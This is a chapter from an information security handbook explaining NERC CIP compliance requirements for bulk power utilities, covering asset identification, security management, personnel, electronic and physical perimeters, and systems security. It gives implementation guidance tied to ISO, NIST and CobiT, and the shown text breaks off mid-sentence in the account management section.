Bonnie Goins Pilewski and Christopher A. Pilewski
Contents
14.1	 Introduction..............................................................................................164
14.2	 Critical Cyber Asset Identification (CIP-002)...........................................165
14.2.1	Critical Asset Identification Method..............................................166
14.2.2	Critical Asset Identification...........................................................166
14.2.3	Critical Cyber Asset Identification.................................................166
14.2.4	Annual Approval...........................................................................166
14.3	 Security Management Controls (CIP-003)................................................167
14.3.1	Cyber Security Policy.....................................................................167
14.3.2	Leadership.....................................................................................168
14.3.3	Exceptions.....................................................................................168
14.3.4	Information Protection..................................................................169
14.3.5	Access Control...............................................................................169
14.3.6	Change Control and Configuration Management.........................170
14.4	 Personnel and Training (CIP-004)............................................................170
14.4.1	Awareness......................................................................................171
14.4.2	Training.........................................................................................171
14.4.3	Personnel Risk Assessment.............................................................172
14.4.4	Access............................................................................................172
14.5	 Electronic Security Perimeters (CIP-005)..................................................172
14.5.1	Electronic Security Perimeter.........................................................173
14.5.2	Electronic Access Controls.............................................................173

164  ◾  Information Security Management Handbook
14.1  Introduction
Government, corporate, and industry compliance has become a mainstay of 
business life for the world’s population. This is due to the recognized need for 
secured operations, facilitated through the implementation of appropriate con-
trols and governance mechanisms. Federally regulated utilities have also been 
affected by the demand for increased security surrounding bulk operations. As 
a result, on July 20, 2006, the Federal Energy Regulatory Commission certified 
the NERC Corporation (a merger of the North American Electric Reliability 
Council and the North American Electric Reliability Corporation) as the “elec-
tric reliability organization.” Details on the organization’s Website state that 
14.5.3	Monitoring Electronic Access........................................................173
14.5.4	Cyber Vulnerability Assessment.....................................................174
14.5.5	Documentation Review and Maintenance.....................................174
14.6	 Physical Security of Critical Cyber Assets (CIP-006)................................175
14.6.1	Physical Security Plan....................................................................176
14.6.2	Physical Access Controls................................................................176
14.6.3	Monitoring Physical Access...........................................................177
14.6.4	Logging Physical Access.................................................................177
14.6.5	Access Log Retention.....................................................................177
14.6.6	Maintenance and Testing..............................................................178
14.7	 Systems Security Management (CIP-007).................................................178
14.7.1	Test Procedures..............................................................................179
14.7.2	Ports and Services..........................................................................179
14.7.3	Security Patch Management..........................................................180
14.7.4	Malicious Software Prevention......................................................180
14.7.5	Account Management....................................................................180
14.7.6	Security Status Monitoring............................................................181
14.7.7	Disposal or Redeployment.............................................................182
14.7.8	Cyber Vulnerability Assessment.....................................................182
14.7.9	Documentation Review and Maintenance.....................................182
14.8	 Incident Reporting and Response Planning (CIP-008).............................182
14.8.1	Cyber Security Incident Response Plan..........................................183
14.8.2	Cyber Security Incident Documentation.......................................183
14.9	 Recovery Plans for Critical Assets (CIP-009)............................................184
14.9.1	Recovery Plans...............................................................................184
14.9.2	Exercises........................................................................................185
14.9.3	Change Control.............................................................................185
14.9.4	Backup and Restore.......................................................................185
14.9.5	Testing Backup Media...................................................................186
14.10 Conclusion...............................................................................................186
Bibliography.......................................................................................................186

NERC Compliance  ◾  165
“NERC’s mission is to improve the reliability and security of the bulk power 
system in North America. To achieve that, NERC develops and enforces reli-
ability standards; monitors the bulk power system; assesses future adequacy; 
audits owners, operators, and users for preparedness; and educates and trains 
industry personnel.”
The purpose of this chapter is to educate the security practitioner in the field 
regarding NERC compliance requirements. Information based on the international 
standards (i.e., ISO 17799/27002 and ISO 20000), best practices, and control 
frameworks (i.e., CobiT, NIST) is also provided in the discussion of the implemen-
tation of controls within each of the identified standards.
Security practitioners and organizations alike should take note that, although 
this chapter is targeted toward compliance to the NERC standards, the recom-
mendations for implementation detailed within could be expanded and used by the 
organization in building or enhancing its enterprise security program.
14.2  Critical Cyber Asset Identification (CIP-002)
As stated in the NERC standards, the purpose of CIP-002 is to “provide a cyber 
security framework for the identification and protection of critical cyber assets to 
support reliable operation of the bulk electric system.”
To facilitate the identification and protection of critical assets (CAs) and critical 
cyber assets (CCAs), CIP-002 requires the following to be completed by the affected 
organizations (“responsible entities”), as directly stated in the NERC standards:
Critical asset identification method (R1): The responsible entity shall iden-
◾
◾
tify and document a risk-based assessment methodology to use to identify its 
critical assets.
Critical asset identification (R2): The responsible entity shall develop a list of 
◾
◾
its identified critical assets determined through an annual application of the 
risk-based assessment methodology required in R1. The responsible entity 
shall review this list at least annually, and update it as necessary.
Critical cyber asset identification (R3): Using the list of critical assets devel-
◾
◾
oped pursuant to requirement R2, the responsible entity shall develop a list 
of associated critical cyber assets essential to the operation of the critical asset. 
Examples at control centers and backup control centers include systems and 
facilities at master and remote sites that provide monitoring and control, 
automatic generation control, real-time power system modeling, and real-
time interutility data exchange. The responsible entity shall review this list at 
least annually, and update it as necessary.
Annual approval (R4): A senior manager or delegate(s) shall approve annually 
◾
◾
the list of critical assets and the list of critical cyber assets. Based on require-
ments R1, R2, and R3, the responsible entity may determine that it has no 

166  ◾  Information Security Management Handbook
critical assets or critical cyber assets. The responsible entity shall keep a signed 
and dated record of the senior manager’s or delegates’ approval of the list of 
critical assets and the list of critical cyber assets (even if such lists are null).
14.2.1  Critical Asset Identification Method
The determination of an appropriate risk assessment method for critical asset iden-
tification is fairly straightforward. Many organizations may choose to use existing 
frameworks such as OCTAVE or NIST Special Publication 800:30, or to adapt 
security assessment methods such as the National Security Agency Information 
Assurance Method. This is a reasonable decision that promotes the use of freely 
available and vetted methods, precluding the need to develop an assessment method 
from scratch that may or may not adequately address the requirement. In addition, 
these tools come complete with surveys and other instruments that are critical in 
successfully collecting the data required for the effort. Additional implementation 
guidance can be determined from Section 4 of the ISO 17799/27002, the Code of 
Practice for Information Security Management.
14.2.2  Critical Asset Identification
Critical asset identification for NERC is conducted in the same way as an organiza-
tion would identify critical assets for other business or regulatory purposes. A cau-
tion to assessors is to ensure that scope is restricted to the bulk electric system only. 
Should the organization also sponsor a nuclear capability, for example, this method 
can be applied, but it is outside the scope of NERC compliance.
14.2.3  Critical Cyber Asset Identification
For the purposes of identifying systems that affect bulk operations, a mecha-
nism such as that identified in NIST Special Publication 800:30 for systems 
characterization is highly beneficial. This characterization allows the assessor 
to classify and document the state of the assets for identification and auditing 
purposes. This characterization will also be used in subsequent CIPs to help 
in delineating the electronic security perimeter (CIP-005), establishing moni-
toring requirements for the asset (CIP-007), and constructing an appropriate 
vulnerability assessment method for technical evaluation of the assets (CIP-005 
and CIP-007).
14.2.4  Annual Approval
Annual approval of the lists of critical assets and critical cyber assets can be com-
pleted and documented through the use of either an automated workflow process 
or a manual review cycle. Proper documentation includes an authorized signature 

NERC Compliance  ◾  167
on the risk assessment matrix for the assets itself or on a cover sheet that is attached 
to the asset lists. An archived or electronic copy of the approval should be securely 
maintained for future use.
14.3  Security Management Controls (CIP-003)
As stated in the NERC standards, “Standard CIP-003 requires that responsible 
entities have minimum security management controls in place to protect critical 
cyber assets.”
To facilitate the identification and implementation of appropriate security man-
agement controls, NERC requires the following to be completed by the affected 
organizations (“responsible entities”), as directly stated in the NERC standards:
Cyber security policy (R1): The responsible entity shall document and imple-
◾
◾
ment a cyber security policy that represents management’s commitment and 
ability to secure its critical cyber assets.
Leadership (R2): The responsible entity shall assign a senior manager with 
◾
◾
overall responsibility for leading and managing the entity’s implementation 
of, and adherence to, Standards CIP-002 through CIP-009.
Exceptions (R3): Instances where the responsible entity cannot conform to its 
◾
◾
cyber security policy must be documented as exceptions and authorized by 
the senior manager or delegate(s).
Information protection (R4): The responsible entity shall implement and 
◾
◾
document a program to identify, classify, and protect information associated 
with critical cyber assets.
Access control (R5): The responsible entity shall document and implement a 
◾
◾
program for managing access to protected critical cyber asset information.
Change control and configuration management (R6): The responsible entity 
◾
◾
shall establish and document a process of change control and configuration 
management for adding, modifying, replacing, or removing critical cyber 
asset hardware or software, and implement supporting configuration man-
agement activities to identify, control, and document all entity or vendor-
related changes to hardware and software components of critical cyber assets 
pursuant to the change control process.
14.3.1  Cyber Security Policy
Paramount to communicating expectations to staff, business partners, and third 
parties is the creation of a comprehensive security policy for NERC compliance, 
relative to people, process, data, technology, and facilities. The policy should 
encompass all identified areas of the Code of Practice for Information Security 
Management (ISO 17799/27002). Given that NIST has been a framework used 

168  ◾  Information Security Management Handbook
heavily in completion of the NERC compliance objectives, care should be taken to 
ensure that the policy meets controls associated with this activity for compliance. A 
list of NIST controls is available in Special Publication 800:53A.
Sample policies are available in abundance on the Internet, covering a variety 
of topics. Policies are communication of management expectations and should not, 
therefore, detail how to perform a function; this is left to procedural documenta-
tion. A policy should contain, at minimum:
Introduction or background
◾
◾
Purpose
◾
◾
Scope
◾
◾
Definitions
◾
◾
Policy statement
◾
◾
References, including corresponding policies, standards, and procedures
◾
◾
Information on the version and effective dates
◾
◾
Approval by senior management
◾
◾
It is important to note that processes for implementation, maintenance (includ-
ing annual review and update), monitoring for effectiveness, and enforcement must 
also be considered and, if implemented, reviewed and updated at least annually.
14.3.2  Leadership
Assignment of accountable senior management for completion of NERC compli-
ance is critical to the organization’s success. Although it is not mandatory that 
the same resource be dedicated throughout the life of the compliance initiative, 
dedication provides continuity and stability to this important initiative. Formal 
documentation of the assignment, along with signatures from senior management, 
should be completed as part of this compliance objective.
14.3.3  Exceptions
Although it is advisable to construct policies, standards, procedures, plans, and 
programs such that they may govern the organization’s NERC function without 
the need for exceptions, it is clear that an exception over time may be required. The 
organization should implement a formal and documented exception process that 
is followed for every exception requested. Information documenting the exception 
should include, at minimum:
Requestor
◾
◾
Department
◾
◾
Date of request
◾
◾
Affected policy deliverable
◾
◾

NERC Compliance  ◾  169
Scope of the exception
◾
◾
Reason for the exception request
◾
◾
Documentation to support the need for the exception
◾
◾
Signature of departmental manager indicating the exception has been 
◾
◾
reviewed and is authorized by departmental management
Approval from senior management prior to authorizing the exception and 
◾
◾
noting it in the policy deliverable
The exception process should itself be reviewed annually, approved by senior 
management, and updated as required.
14.3.4  Information Protection
In its truest sense, information protection surrounds the data (information) 
classification effort within the organization, as it applies to NERC information 
assets. Once classification is completed, proper controls must be applied to pro-
tect the information, based on its criticality. The implementation guidance from 
ISO 17799/27002, Section 7 (Asset Management), can assist the organization 
in building an appropriate classification scheme and performing the assessment 
of information assets. Policies for proper labeling and handling, based on the 
classification, should be included either in the security policy or implemented 
as a stand-alone policy requirement. Formal and documented standards and 
procedures should also be created, approved by senior management, and imple-
mented. Note that all this documentation will also require maintenance, moni-
toring, and enforcement.
In terms of applying controls to the assets for the purposes of protection, there 
are a number of frameworks, in addition to the ISO standards, that can be used 
to determine a desired control set for NERC compliance. Controls detailed in 
the CobiT framework, as well as controls described in NIST Special Publication 
800:53A, will give the organization a control set from which to select its protec-
tions. Once controls are selected, they should be formally documented, planned, 
approved by senior management, and applied to the assets.
14.3.5  Access Control
The access control program for NERC should include considerations not only for 
electronic access control, but for physical access control as well. As a foundation, 
formal and documented policies, standards, and procedures for performance of 
this work should be completed and approved by senior management. The policies 
may be incorporated into the NERC security policy or may appear as stand-alone 
policies, as desired. In addition, processes performed within the program must be 
formally detailed and approved as well. At a minimum, the following processes 
should be included in the access control program:

170  ◾  Information Security Management Handbook
The process for determination and assignment of permissions to staff with 
◾
◾
need-to-know for NERC compliance
The process for creation, implementation, maintenance (including periodic 
◾
◾
review), and monitoring of access control lists for both electronic access and 
physical access to NERC critical and critical cyber assets, as well as to NERC 
critical information assets
The process for periodic review and update of electronic and physical access lists
◾◾
The processes for provisioning of electronic and physical access, preferably 
◾
◾
based upon role (RBAC), including management authorization
The processes for deprovisioning of electronic and physical access, including 
◾
◾
management authorization
The processes for creation and assignment of access control mechanisms (such 
◾
◾
as proximity cards, tokens or fobs, and so on)
The processes for third-party electronic and physical access
◾
◾
Inputs to these processes would likely come from Human Resources (relative 
to role assignment, which is typically based upon job function or description), 
Facilities, and Corporate Security (physical access).
Implementation guidelines for access control can be obtained from Section 11 
(Access Control) of the Code of Practice for Information Security Management 
(ISO 17799), NIST Special Publications 800:53A, 800:39, and DS-5: Ensure 
Systems Security (CobiT).
14.3.6  Change Control and Configuration Management
The foundation for the implementation of robust change control and configura-
tion management processes must start with formal, documented, and approved 
policies, standards, and procedures detailing the processes. The practitioner may 
wish to use ISO 20000 or IT Infrastructure Library (ITIL) practices to build an 
internal change control and configuration management capability. It is important 
to note that provisions for emergency changes must also be formally documented 
and approved by senior management.
Implementation guidance for this effort can be found in Section 9 (Control 
Processes) of the Code of Practice for Information Technology Service Management 
(ISO 20000-2).
14.4  Personnel and Training (CIP-004)
As stated in the NERC standards, “Standard CIP-004 requires that personnel 
having authorized cyber or authorized unescorted physical access to critical cyber 
assets, including contractors and service vendors, have an appropriate level of per-
sonnel risk assessment, training, and security awareness.”

NERC Compliance  ◾  171
To facilitate the identification and implementation of appropriate security 
awareness, training, and education, NERC requires the following to be com-
pleted by the affected organizations (“responsible entities”), as directly stated in 
the NERC standards:
Awareness (R1): The responsible entity shall establish, maintain, and docu-
◾
◾
ment a security awareness program to ensure that personnel having authorized 
cyber or authorized unescorted physical access receive ongoing reinforcement 
in sound security practices. The program shall include security awareness 
reinforcement on at least a quarterly basis.
Training (R2): The responsible entity shall establish, maintain, and docu-
◾
◾
ment an annual cyber security training program for personnel having autho-
rized cyber or authorized unescorted physical access to critical cyber assets, 
and review the program annually and update as necessary.
Personnel risk assessment (R3): The responsible entity shall have a docu-
◾
◾
mented personnel risk assessment program, in accordance with federal, 
state, provincial, and local laws, and subject to existing collective bargain-
ing unit agreements, for personnel having authorized cyber or authorized 
unescorted physical access. A personnel risk assessment shall be conducted 
pursuant to that program within 30 days of such personnel being granted 
such access.
Access (R4): The responsible entity shall maintain list(s) of personnel with 
◾
◾
authorized cyber or authorized unescorted physical access to critical cyber 
assets, including their specific electronic and physical access rights to critical 
cyber assets.
14.4.1  Awareness
Periodic security awareness training within an organization can be accomplished 
through a variety of means, including formalized in-class and computer-based train-
ing. Regardless of the method selected, a formalized and documented approach 
should be implemented. A good reference for the building of this program is avail-
able through NIST Special Publication 800:50. It is important to note that, in this 
case, awareness training must be provided for all staff with NERC responsibilities 
or access to NERC data.
14.4.2  Training
The same methodology as mentioned previously can be used for the completion of a 
NERC training program for affected staff. Content will vary, as the purpose of this 
training program is to socialize staff with the requirements for NERC compliance 
and to establish their roles in the compliance objective.

172  ◾  Information Security Management Handbook
14.4.3  Personnel Risk Assessment
All staff with access to NERC data or systems must be assessed for risk prior to the 
granting of access to these systems. There are a variety of methods for performance 
of this objective; it is advisable for the resource or team performing this function 
to enlist the help of the Human Resources and Facilities departments to complete 
this requirement.
14.4.4  Access
The topic of access control (both electronic and physical) has been discussed in 
detail in Section 14.3 of this chapter; the recommended course of action can also 
contribute to compliance for this area of the NERC standards.
14.5  Electronic Security Perimeters (CIP-005)
As stated in the NERC standards, “Standard CIP-005 requires the identification 
and protection of the electronic security perimeter(s) inside which all critical 
cyber assets reside, as well as all access points on the perimeter.”
To facilitate the identification and implementation of appropriate elec-
tronic access control, NERC requires the following to be completed by the 
affected organizations (“responsible entities”), as directly stated in the NERC 
standards:
Electronic security perimeter (R1): The responsible entity shall ensure that 
◾
◾
every critical cyber asset resides within an electronic security perimeter. 
The responsible entity shall identify and document the electronic security 
perimeter(s) and all access points to the perimeter(s).
Electronic access controls (R2): The responsible entity shall implement and 
◾
◾
document the organizational processes and technical and procedural mecha-
nisms for control of electronic access at all electronic access points to the 
electronic security perimeter(s).
Access (R3): The responsible entity shall implement and document an elec-
◾
◾
tronic or manual process for monitoring and logging access at access points 
to the electronic security perimeters 24 hours a day, seven days a week.
Cyber vulnerability assessment (R4): The responsible entity shall perform a 
◾
◾
cyber vulnerability assessment of the electronic access points to the electronic 
security perimeter(s) at least annually.
Documentation review and maintenance (R5): The responsible entity shall 
◾
◾
review, update, and maintain all documentation to support compliance with 
the requirements of Standard CIP-005.

NERC Compliance  ◾  173
14.5.1  Electronic Security Perimeter
In any secure architecture, creation of zones is essential to ensure that assets 
requiring heightened protection are segmented off from more public-facing areas 
of the network. In addition, the secured zone will often receive expanded control 
implementation. Paramount to this activity for NERC is the segmentation of 
NERC assets from non-NERC assets. This includes elimination of dial-up and 
communication lines from within the secured zone. If they remain, they will also 
be considered as NERC critical and will require significantly enhanced control 
implementation.
When the architecture has been implemented, a detailed network diagram 
should be completed accurately to reflect the zones, included assets, and access 
points to those zones.
Implementation guidelines for access control can be obtained from Section 11 
(Access Control) of the Code of Practice for Information Security Management 
(ISO 17799/27002), NIST Special Publications 800:53A, 800:39, and DS-5: 
Ensure Systems Security (CobiT).
14.5.2  Electronic Access Controls
This requirement reflects the need for proper control of access, through implemen-
tation of protections and configuration management. In particular, the organiza-
tion should ensure that network devices, such as firewalls, are configured with rules 
that implicitly deny and explicitly allow; ports and services that are not necessary 
for job function are disabled; any dialups present in the electronic security perim-
eter are secured; appropriate use banners are implemented on NERC assets; and 
that protections implemented are formally documented.
Access control considerations for this part of the NERC standard have been 
discussed earlier in this chapter.
Implementation guidelines for access control can be obtained from Section 11 
(Access Control) of the Code of Practice for Information Security Management 
(ISO 17799/27002), NIST Special Publications 800:53A, 800:39, and DS-5: 
Ensure Systems Security (CobiT).
14.5.3  Monitoring Electronic Access
For the purposes of this section, monitoring refers to the tracking of unauthor-
ized access into the electronic security perimeter, through access points to the 
network, and to dialups using nonroutable protocols. Implementation of moni-
toring tools that provide automated alerts is highly desirable; however, it is equally 
important that logs generated by the monitoring are periodically and formally 
reviewed by skilled staff. This function can also be outsourced, should the orga-
nization desire. At minimum, network-based monitoring must be undertaken; 

174  ◾  Information Security Management Handbook
however, the organization may also opt to conduct host-based monitoring as a 
part of this effort.
Implementation guidelines for this work can be reviewed in Section 10.10 
(Monitoring) of the Code of Practice for Information Security Management (ISO 
17799/27002), NIST Special Publications 800:53A, 800:39, DS-5: Ensure Systems 
Security, ME-1: Monitor and Evaluate IT Performance, and ME-2: Monitor and 
Evaluate Internal Control (CobiT).
14.5.4  Cyber Vulnerability Assessment
To determine whether NERC assets are appropriately protected, a technical vul-
nerability assessment must be performed at least annually on these assets. It is 
also highly recommended that the organization perform both internal and exter-
nal technical security assessments for this effort. A baseline NERC assessment 
could include
Network discovery
◾
◾
Discovery of all access points to the secure (NERC) zone
◾
◾
Port scanning
◾
◾
Scanning for enabled services
◾
◾
Scanning for default accounts and passwords
◾
◾
Password cracking
◾
◾
Scanning SNMP community strings
◾
◾
Configuration reviews (manual process) of network devices, servers, and 
◾
◾
workstations, as included in the NERC assets for the organization
Any additional assessment services desired by the organization (such as social 
◾
◾
engineering, penetration testing, and so on)
Post-assessment, the results of the assessment, along with a description of the 
method for conducting the assessment, must be formally documented and pre-
sented to the organization for review and comment, as appropriate.
Implementation guidelines for this work can be reviewed in Section 12.6 
(Technical Vulnerability Management) of the Code of Practice for Information 
Security Management (ISO 17799/27002), NIST Special Publications 800:53A, 
800:39, DS-5: Ensure Systems Security, PO-9: Assess and Manage IT Risks 
(CobiT), and Section 6.6.3 (Security Risk Assessment Practices) in the Code of 
Practice for Information Technology Service Management (ISO 20000-2).
14.5.5  Documentation Review and Maintenance
Documentation must also be maintained for this effort, as has been stated previ-
ously. Documentation for this effort should include

NERC Compliance  ◾  175
Current configuration and processes for conducting the work for CIP-005, to 
◾
◾
be reviewed formally at least annually.
Should revisions to the network occur, a modified document is required 
◾
◾
within 90 calendar days of the update.
Access logs shall be kept for a minimum of 90 days, with the exception of 
◾
◾
reportable incident logs, which are kept for three years in a secured location 
(see CIP-008).
14.6  Physical Security of Critical 
Cyber Assets (CIP-006)
As stated in the NERC standards, “Standard CIP-006 is intended to ensure 
the implementation of a physical security program for the protection of critical 
cyber assets.”
To facilitate the identification and implementation of appropriate physical secu-
rity controls, NERC requires the following to be completed by the affected organi-
zations (“responsible entities”), as directly stated in the NERC standards:
Physical security plan (R1): The responsible entity shall create and maintain a 
◾
◾
physical security plan, approved by a senior manager or delegate(s)
Physical access controls (R2): The responsible entity shall document and 
◾
◾
implement the operational and procedural controls to manage physical access 
at all access points to the physical security perimeters 24 hours a day, seven 
days a week.
Monitoring physical access (R3): The responsible entity shall document and 
◾
◾
implement the technical and procedural controls for monitoring physical 
access at all access points to the physical security perimeters 24 hours a day, 
seven days a week. Unauthorized access attempts shall be reviewed immedi-
ately and handled in accordance with the procedures specified in the require-
ments of Standard CIP-008.
Logging physical access (R4): Logging shall record sufficient information to 
◾
◾
uniquely identify individuals and the time of access 24 hours a day, seven days 
a week. The responsible entity shall implement and document the technical 
and procedural mechanisms for logging physical entry at all access points to 
the physical security perimeter(s).
Access log retention (R5): The responsible entity shall retain physical access 
◾
◾
logs for at least 90 calendar days. Logs related to reportable incidents shall be 
kept in accordance with the requirements of Standard CIP-008.
Maintenance and testing (R6): The responsible entity shall implement a 
◾
◾
maintenance and testing program to ensure that all physical security systems 
under requirements R2, R3, and R4 function properly.

176  ◾  Information Security Management Handbook
14.6.1  Physical Security Plan
The physical security plan includes the following components:
Inclusion of all NERC assets within a “six-wall (four sides, a ceiling, and a 
◾
◾
floor)” perimeter that provides physical access control to the assets, along 
with the documented processes for securing access
The process for identification of all physical access points to NERC assets and 
◾
◾
appropriate methods to control physical access at these points
A detailed method for monitoring physical access at each of these access points
◾◾
Procedures for appropriate operation of physical access controls
◾
◾
Procedures that detail physical access control, which includes visitor control, 
◾
◾
use of appropriate access control mechanisms, and response to loss of assets
Process for annual review of the plan
◾
◾
Process for review and update of the plan within 90 days of physical access 
◾
◾
control changes
Implementation guidelines for this work can be reviewed in Section 9 
(Physical and Environmental Security) of the Code of Practice for Information 
Security Management (ISO 17799/27002), NIST Special Publications 800:53A, 
800:39, DS-5: Ensure Systems Security, and DS-12: Manage the Physical 
Environment (CobiT).
14.6.2  Physical Access Controls
Organizations are required to document, implement, and operate controls for the provi-
sion of physical access to NERC assets. Acceptable controls for physical access include
Proximity cards
◾
◾
Security personnel, such as a guard contingent, centralized operations center, 
◾
◾
and so on
Specialty locks (magnetic remote access control locks, mantraps, and restricted 
◾
◾
access locks)
Devices that promote two-factor authentication, such as biometric devices, 
◾
◾
tokens, and so on
Implementation guidelines for this work can be reviewed in Section 9 
(Physical and Environmental Security) of the Code of Practice for Information 
Security Management (ISO 17799/27002), NIST Special Publications 800:53A, 
800:39, DS-5: Ensure Systems Security, and DS-12: Manage the Physical 
Environment (CobiT).

NERC Compliance  ◾  177
14.6.3  Monitoring Physical Access
Physical access to NERC assets must be continuously monitored (24/7/365). 
Monitoring should include both automated controls, such as alarm systems, and 
human controls, such as review of physical access points by NERC personnel. 
Monitoring should be formal and documented.
Implementation guidelines for this work can be reviewed in Section 9 (Physical 
and Environmental Security) and Section 10 (Communications and Operations 
Management) of the Code of Practice for Information Security Management (ISO 
17799/27002), NIST Special Publications 800:53A, 800:39, DS-5: Ensure Systems 
Security, and DS-12: Manage the Physical Environment (CobiT).
14.6.4  Logging Physical Access
Physical access to NERC-secured areas must be logged. Acceptable methods for 
logging include
Automated logging, such as those produced by use of proximity cards
◾
◾
Camera/DVR recording of entrance to and exit from the NERC physical 
◾
◾
access points
Manual review of visitor logs, recordings, and log files generated by auto-
◾
◾
mated means
Logging must identify the individual gaining access and the time of access. 
Logging must be performed 24/7/365.
Implementation guidelines for this work can be reviewed in Section 9 (Physical 
and Environmental Security) and Section 10 (Communications and Operations 
Management) of the Code of Practice for Information Security Management (ISO 
17799/27002), NIST Special Publications 800:53A, 800:39, DS-5: Ensure Systems 
Security, and DS-12: Manage the Physical Environment (CobiT).
14.6.5  Access Log Retention
Access logs for physical security must be retained in a secure location for at least 90 
days in order to meet NERC compliance, with the exception of logs involved in a 
reportable incident. These logs must be securely retained for three years.
Implementation guidelines for this work can be reviewed in Section 9 
(Physical and Environmental Security) of the Code of Practice for Information 
Security Management (ISO 17799/27002), NIST Special Publications 800:53A, 
800:39, DS-5: Ensure Systems Security, and DS-12: Manage the Physical 
Environment (CobiT).

178  ◾  Information Security Management Handbook
14.6.6  Maintenance and Testing
To determine that NERC physical access controls are implemented properly and 
are operating effectively, they must be tested and maintained. This testing and 
maintenance cycle cannot exceed three years. Retention of these records is deter-
mined based on this cycle. Any records related to outages must be retained for a 
minimum of one year from the outage.
Implementation guidelines for this work can be reviewed in Section 9 
(Physical and Environmental Security) of the Code of Practice for Information 
Security Management (ISO 17799/27002), NIST Special Publications 800:53A, 
800:39, DS-5: Ensure Systems Security, and DS-12: Manage the Physical 
Environment (CobiT).
14.7  Systems Security Management (CIP-007)
As stated in the NERC standards, “Standard CIP-007 requires responsible enti-
ties to define methods, processes, and procedures for securing those systems deter-
mined to be critical cyber assets, as well as the noncritical cyber assets within the 
electronic security perimeter(s).”
To facilitate the identification and implementation of appropriate system secu-
rity controls, NERC requires the following to be completed by the affected organi-
zations (“responsible entities”), as directly stated in the NERC standards:
Test procedures (R1): The responsible entity shall ensure that new cyber 
◾
◾
assets and significant changes to existing cyber assets within the electronic 
security perimeter do not adversely affect existing cyber security controls. 
For purposes of Standard CIP-007, a significant change shall, at a minimum, 
include implementation of security patches, cumulative service packs, vendor 
releases, and version upgrades of operating systems, applications, database 
platforms, or other third-party software or firmware.
Ports and services (R2): The responsible entity shall establish and document 
◾
◾
a process to ensure that only those ports and services required for normal and 
emergency operations are enabled.
Security patch management (R3): The responsible entity, either separately 
◾
◾
or as a component of the documented configuration management process 
specified in CIP-003 requirement R6, shall establish and document a security 
patch management program for tracking, evaluating, testing, and installing 
applicable cyber security software patches for all cyber assets within the elec-
tronic security perimeter(s).
Malicious software prevention (R4): The responsible entity shall use anti-virus 
◾
◾
software and other malicious software (“malware”) prevention tools, where 
technically feasible, to detect, prevent, deter, and mitigate the introduction, 

NERC Compliance  ◾  179
exposure, and propagation of malware on all cyber assets within the elec-
tronic security perimeter(s).
Account management (R5): The responsible entity shall establish, implement, 
◾
◾
and document technical and procedural controls that enforce access authen-
tication of, and accountability for, all user activity, and that minimize the risk 
of unauthorized system access.
Security status monitoring (R6): The responsible entity shall ensure that all 
◾
◾
cyber assets within the electronic security perimeter, as technically feasible, 
implement automated tools or organizational process controls to monitor sys-
tem events that are related to cyber security.
Disposal or redeployment (R7): The responsible entity shall establish formal 
◾
◾
methods, processes, and procedures for disposal or redeployment of cyber 
assets within the electronic security perimeter(s) as identified and docu-
mented in Standard CIP-005.
Cyber vulnerability assessment (R8): The responsible entity shall perform a 
◾
◾
cyber vulnerability assessment of all cyber assets within the electronic secu-
rity perimeter at least annually.
Documentation review and maintenance (R9): The responsible entity shall 
◾
◾
review and update the documentation specified in Standard CIP-007 at least 
annually. Changes resulting from modifications to the systems or controls 
shall be documented within 90 calendar days of the change.
14.7.1  Test Procedures
It is imperative that any changes to a NERC asset are tested to ensure that they 
do not adversely impact operations or any other NERC asset. These include con-
figuration changes, such as the implementation of security patches, service packs, 
operating system upgrades, and so on. Formalized and documented test procedures 
are required for compliance in this area. All testing performed must reflect the 
production environment for the NERC.
Implementation guidelines for this work can be reviewed in Section 10 
(Communications and Operations Management) of the Code of Practice for 
Information Security Management (ISO 17799/27002), NIST Special Publications 
800:53A, 800:39, DS-4: Ensure Continuous Service, DS-5: Ensure Systems 
Security, and DS-9: Manage the Configuration (CobiT).
14.7.2  Ports and Services
To secure systems appropriately, the “hardening” of hosts must be completed. This 
entails the disabling of ports and services that are unnecessary for normal or emer-
gency operations. If it is not possible to disable a port or service due to technical 
infeasibility or for business reasons, it is necessary to implement compensating con-

180  ◾  Information Security Management Handbook
trols to provide the same level of protection as would be achieved through disabling 
of the port or service.
Implementation guidelines for this work can be reviewed in Section 10 
(Communications and Operations Management) of the Code of Practice 
for Information Security Management (ISO 17799/27002), NIST Special 
Publications 800:53A, 800:39, DS-4: Ensure Continuous Service, DS-5: Ensure 
Systems Security, DS-9: Manage the Configuration (CobiT), and Section 9 
(Control Processes) of the Code of Practice for Information Technology Service 
Management (ISO 20000-2).
14.7.3  Security Patch Management
There are two options for completion of this compliance objective: this work can be 
completed in the Configuration Management portion of CIP-003 or it can be com-
pleted here. This objective requires the organization to evaluate relevant security 
patches for applicability within 30 days of their release. In the event that an orga-
nization decides not to implement a relevant patch, it must formally document the 
justification for doing so and indicate the compensating controls put in place to 
protect the NERC assets.
Implementation guidelines for this work can be reviewed in Section 10 
(Communications and Operations Management) of the Code of Practice for 
Information Security Management (ISO 17799/27002), NIST Special Publications 
800:53A, 800:39, DS-4: Ensure Continuous Service, DS-5: Ensure Systems 
Security, DS-9: Manage the Configuration (CobiT), and Section 9 (Control 
Processes) of the Code of Practice for Information Technology Service Management 
(ISO 20000-2).
14.7.4  Malicious Software Prevention
NERC assets must be protected from viruses and malicious code. Anti-virus and 
malicious software tools must be implemented as a result. If, for any reason, the 
tools cannot be implemented, the organization must document compensating con-
trols that provide the required protection for the assets.
Implementation guidelines for this work can be reviewed in Section 10 
(Communications and Operations Management) of the Code of Practice for 
Information Security Management (ISO 17799/27002), NIST Special Publications 
800:53A, 800:39, and DS-5: Ensure Systems Security.
14.7.5  Account Management
Although this objective shares commonality with the access control requirements 
mentioned prior in the chapter, there are additional requirements to be met for 
account management. The previous access control section delineated the need for a 

NERC Compliance  ◾  181
formal and documented provisioning process, to be carried out by authorized per-
sonnel. The same is true for meeting this compliance objective. In addition, there is 
a stated need to perform a review of access, at least annually, in a formal and docu-
mented fashion. Formal procedures should be documented to detail mechanisms 
for performing this review. Access to systems must also be logged for a minimum 
of 90 days to create a historical audit trail for access.
The requirements for handling of shared, generic, and vendor default pass-
words are also noted here. Where possible, these passwords must be changed to a 
unique, strong password. If there is a business justification or technical infeasibil-
ity, it must be demonstrated that there are compensating controls to address this 
issue and to protect NERC assets. In addition, standard passwords must adhere to 
the following requirements:
Passwords shall contain at least six characters; if length requirements are greater 
◾
◾
based on the organization’s password policies, default to the longer password
Passwords shall require letters, numbers, and special characters
◾
◾
Passwords shall be changed at least annually or greater, dependent on risk; 
◾
◾
if the password policy for the organization stipulates password changes more 
frequently than annually, default to the lesser time
Note that a policy for password maintenance is required for NERC compliance. If 
